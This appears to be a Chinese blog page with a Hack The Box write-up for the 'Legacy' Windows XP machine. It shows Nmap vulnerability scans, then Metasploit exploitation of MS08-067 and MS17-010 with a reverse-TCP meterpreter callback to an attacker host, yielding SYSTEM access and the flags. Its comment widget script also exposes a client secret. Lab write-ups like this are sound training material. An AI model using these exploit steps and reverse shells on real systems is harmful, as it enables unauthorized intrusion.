@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Legacy - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Legacy靶场信息  靶场类型  信息搜集NmapStarting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-03-02 00:06 EST Nmap scan report for 10.10.10.4 Host is up (0.54s latency). Not shown: 65532 filtered ports PORT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Legacy - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Legacy靶场信息  靶场类型  信息搜集NmapStarting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2022-03-02 00:06 EST Nmap scan report for 10.10.10.4 Host is up (0.54s latency). Not shown: 65532 filtered ports PORT">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/f5eb7547-9e3a-4cc8-842f-a2ab974ba777.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/84aed2b0-7cde-457b-a81b-01aefa5b1490.png">
+<meta property="article:published_time" content="2022-03-02T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:46:21.961Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/f5eb7547-9e3a-4cc8-842f-a2ab974ba777.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Legacy - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Legacy - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-03-02T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-03-02
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Legacy"><span class="post-toc-text">Hackthebox - Legacy</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Samba"><span class="post-toc-text">Samba</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#MS08-067"><span class="post-toc-text">MS08-067</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#MS17-010"><span class="post-toc-text">MS17-010</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Flag"><span class="post-toc-text">Flag</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Easy/Hackthebox-Legacy"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Legacy - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-03-02 19:38:36" datetime="2022-03-02T11:38:36.000Z"  itemprop="datePublished">2022-03-02</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Legacy"><a href="#Hackthebox-Legacy" class="headerlink" title="Hackthebox - Legacy"></a>Hackthebox - Legacy</h1><h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><img src="/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/f5eb7547-9e3a-4cc8-842f-a2ab974ba777.png" class>
+
+<h2 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h2><img src="/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/84aed2b0-7cde-457b-a81b-01aefa5b1490.png" class>
+
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><pre><code class="bash">Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-02 00:06 EST
+Nmap scan report for 10.10.10.4
+Host is up (0.54s latency).
+Not shown: 65532 filtered ports
+PORT     STATE  SERVICE       VERSION
+139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open   microsoft-ds  Windows XP microsoft-ds
+3389/tcp closed ms-wbt-server
+Device type: general purpose|specialized
+Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (89%)
+OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
+Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP1 or SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows 2000 SP4 (91%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows XP SP2 or SP3 (91%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP SP2 or Windows Server 2003 (90%), Microsoft Windows XP Professional SP3 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host script results:
+|_clock-skew: mean: 5d00h57m39s, deviation: 1h24m49s, median: 4d23h57m40s
+|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:e2:3e (VMware)
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: legacy
+|   NetBIOS computer name: LEGACY\x00
+|   Workgroup: HTB\x00
+|_  System time: 2022-03-07T09:04:30+02:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+TRACEROUTE (using port 3389/tcp)
+HOP RTT       ADDRESS
+1   541.52 ms 10.10.16.1
+2   541.58 ms 10.10.10.4
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 101.31 seconds
+</code></pre>
+<h3 id="Samba"><a href="#Samba" class="headerlink" title="Samba"></a>Samba</h3><pre><code class="bash">┌──(root💀kali)-[~/Desktop/HTB/Easy/Legacy]
+└─# nmap -p445 --min-rate 5000 --script=vuln 10.10.10.4                                                                                                                                                       130 ⨯
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-02 00:10 EST
+Nmap scan report for 10.10.10.4
+Host is up (0.24s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: EOF
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+|           
+|     Disclosure date: 2008-10-23
+|     References:
+|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
+|_smb-vuln-ms10-054: false
+|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: EOF
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+
+Nmap done: 1 IP address (1 host up) scanned in 28.55 seconds
+</code></pre>
+<p>使用vuln插件扫描445端口的smb后发现存在两个漏洞，MS08-067和MS17-010，分别去利用一下试试</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="MS08-067"><a href="#MS08-067" class="headerlink" title="MS08-067"></a>MS08-067</h3><pre><code class="bash">msf6 exploit(windows/smb/ms08_067_netapi) &gt; show options 
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS   10.10.10.4       yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+</code></pre>
+<p>使用指定的exp并设置好配置信息后，输入exploit执行</p>
+<pre><code class="bash">msf6 exploit(windows/smb/ms08_067_netapi) &gt; exploit 
+
+[*] Started reverse TCP handler on 10.10.16.2:4444 
+[*] 10.10.10.4:445 - Automatically detecting the target...
+[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
+[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (175174 bytes) to 10.10.10.4
+[*] Meterpreter session 2 opened (10.10.16.2:4444 -&gt; 10.10.10.4:1032) at 2022-03-02 00:21:27 -0500
+
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt; sysinfo
+Computer        : LEGACY
+OS              : Windows XP (5.1 Build 2600, Service Pack 3).
+Architecture    : x86
+System Language : en_US
+Domain          : HTB
+Logged On Users : 1
+Meterpreter     : x86/windows
+</code></pre>
+<p>成功获得system权限</p>
+<h3 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h3><p>设置好配置后输入exploit执行</p>
+<pre><code class="bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options 
+
+Module options (exploit/windows/smb/ms17_010_psexec):
+
+   Name                  Current Setting                                                 Required  Description
+   ----                  ---------------                                                 --------  -----------
+   DBGTRACE              false                                                           yes       Show extra debug trace info
+   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
+   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
+   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS                10.10.10.4                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT                 445                                                             yes       The Target port (TCP)
+   SERVICE_DESCRIPTION                                                                   no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                                                  no        The service display name
+   SERVICE_NAME                                                                          no        The service name
+   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+   SMBDomain             .                                                               no        The Windows domain to use for authentication
+   SMBPass                                                                               no        The password for the specified username
+   SMBUser                                                                               no        The username to authenticate as
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+   LHOST     10.10.16.2       yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+</code></pre>
+<p>执行成功</p>
+<pre><code class="bash">msf6 exploit(windows/smb/ms17_010_psexec) &gt; exploit 
+
+[*] Started reverse TCP handler on 10.10.16.2:4444 
+[*] 10.10.10.4:445 - Target OS: Windows 5.1
+[*] 10.10.10.4:445 - Filling barrel with fish... done
+[*] 10.10.10.4:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt;
+[*] 10.10.10.4:445 -    [*] Preparing dynamite...
+[*] 10.10.10.4:445 -            [*] Trying stick 1 (x86)...Boom!
+[*] 10.10.10.4:445 -    [+] Successfully Leaked Transaction!
+[*] 10.10.10.4:445 -    [+] Successfully caught Fish-in-a-barrel
+[*] 10.10.10.4:445 - &lt;---------------- | Leaving Danger Zone | ----------------&gt;
+[*] 10.10.10.4:445 - Reading from CONNECTION struct at: 0x81abb3c8
+[*] 10.10.10.4:445 - Built a write-what-where primitive...
+[+] 10.10.10.4:445 - Overwrite complete... SYSTEM session obtained!
+[*] 10.10.10.4:445 - Selecting native target
+[*] 10.10.10.4:445 - Uploading payload... uercgOUf.exe
+[*] 10.10.10.4:445 - Created \uercgOUf.exe...
+[+] 10.10.10.4:445 - Service started successfully...
+[*] Sending stage (175174 bytes) to 10.10.10.4
+[*] 10.10.10.4:445 - Deleting \uercgOUf.exe...
+[*] Meterpreter session 1 opened (10.10.16.2:4444 -&gt; 10.10.10.4:1033) at 2022-03-02 00:31:20 -0500
+</code></pre>
+<p>查看一下系统信息和权限</p>
+<pre><code class="bash">meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter &gt; sysinfo
+Computer        : LEGACY
+OS              : Windows XP (5.1 Build 2600, Service Pack 3).
+Architecture    : x86
+System Language : en_US
+Domain          : HTB
+Logged On Users : 1
+Meterpreter     : x86/windows
+</code></pre>
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><pre><code class="bash">meterpreter &gt; search -f user.txt
+Found 1 result...
+    c:\Documents and Settings\john\Desktop\user.txt (32 bytes)
+meterpreter &gt; cat &#39;c:\Documents and Settings\john\Desktop\user.txt&#39;
+e69af0e4f443de7e36876fda4ec7644f
+meterpreter &gt; search -f root.txt
+Found 1 result...
+    c:\Documents and Settings\Administrator\Desktop\root.txt (32 bytes)
+meterpreter &gt; cat &quot;c:\Documents and Settings\Administrator\Desktop\root.txt&quot;
+993442d258b0e0ec917cae9e695d5713
+meterpreter &gt;
+</code></pre>
+<p>查找并成功拿到flag文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/&title=《Legacy - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/&title=《Legacy - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Legacy - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/03/03/Hackthebox/Easy/Hackthebox-Devel/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Devel - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/03/01/Hackthebox/Easy/Hackthebox-Lame/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Lame - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/&title=《Legacy - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/&title=《Legacy - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Legacy - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/03/02/Hackthebox/Easy/Hackthebox-Legacy/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACpklEQVR42u3aQY7bMBAEwP3/pzdATjnESvcMaW+A4smQLWlKB3Hc5NdXPL5/jz8/Px/ZHE9qODzw8PDwRqW/Gs+kBP9c4ncwnu/y6vd4eHh4t3ntZDBjt2/v5C7/sODh4eF9lNc22ZsGuq0HDw8P7yfz8qY5f6Hj4eHh/Y+8PAiYpaabfPVNWQseHh5ezNu8lD/1+fr6Hh4eHt5oVf35hVs0tUHs20bGUbV4eHh4F3ivTtsAnjF5QNxOCcU/Bjw8PLw1L7nN7HWfX38WEOf3wsPDwzvL228t3ZTSTiftg8bDw8O7x9vEEO25yZLYvpXHw8PDu8drI4DNRPK8CaBt0IvtAnh4eHhHeflWp+TSSctbv9Y30TAeHh7eUd6MtGlw89D2wJIbHh4e3ht5bXi6ucJsY0H00PHw8PCu8drF+1m5+22pdSyCh4eHd42XF5EsdOVlbUKQaIrCw8PDu8Zrl6lmTfZsW2oSiLysDQ8PD+8yLy9xT80fxGaJDg8PD+82bxMT5AW1v9w0+nh4eHg3eLOAoN1WlW842EQYeHh4eO/htVFpHvu2UcKmgY42XeHh4eEd4uVL/ptNADm1vW8x8PDw8A7xkrihbZdnUUXbgkcV4uHh4V3gtS3sPpad/TJ/9H/5Fg8PD+8ob7Ykn5TVRgxtc59MTnh4eHjv4eXRQN5S54Xm0UP0oPHw8PAu8DZ/8mfRbfv4ZmntV7s+hoeHhxfzvsuRn5WUciqMiOY9PDw8vEO8K3PLIqhtQ+S2EcfDw8M7xWsng7axnk0zyXWivwR4eHh413izF3S7qL8/q5608PDw8D7Ky2+WlL5vwaMoBA8PD+8H8GZBbX58M6msWmo8PDy8krcPI2YJcUJKHsHLI3h4eHgXeGeLuDEZzKYoPDw8vAu8X7PVfYKWR5l0AAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
